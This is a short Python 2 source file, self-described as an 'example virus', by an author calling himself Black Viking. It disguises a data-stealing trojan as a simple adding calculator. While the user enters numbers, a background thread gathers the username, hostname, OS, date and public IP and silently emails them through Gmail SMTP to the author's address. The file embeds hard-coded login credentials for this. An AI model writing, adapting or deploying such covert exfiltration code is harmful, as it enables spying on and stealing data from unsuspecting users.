#!/usr/bin/env python2
#-*- coding: utf-8 -*-
#Example virus written in Python
#
#

__author__ = "Black Viking | blackvkng"
__date__ = "01/25/2017"
__mail__ = "yakuza3003@yandex.com"
__github__ = "https://github.com/blackvkng/"

import threading
import smtplib
import re
import urllib2
import getpass
import platform
import time
import socket
import base64

senderMail = "vknglogger@gmail.com"
senderMailPwd = "123456789qwe"
receiverMail = "yakuza3003@yandex.com"

def virus():
    try:
        ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
    except:
        ip = "x.x.x.x"
        pass

    message = """From: Black Viking
Subject: vkngLogger Log

[>] Username\t: %s
[>] Hostname\t: %s
[>] System\t: %s
[>] Date\t\t: %s
[>] IP Adress\t: %s
"""%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(senderMail, senderMailPwd)
        server.sendmail(senderMail, receiverMail, message)
    except:
        pass

def foreground():
    while True:
        a = raw_input("[*] Number: ")
        b = raw_input("[*] Number: ")
        print "[>] Result: "+str(int(a) + int(b))

if __name__ == "__main__":
    threading.Thread(target=virus).start()
    threading.Thread(target=foreground).start()
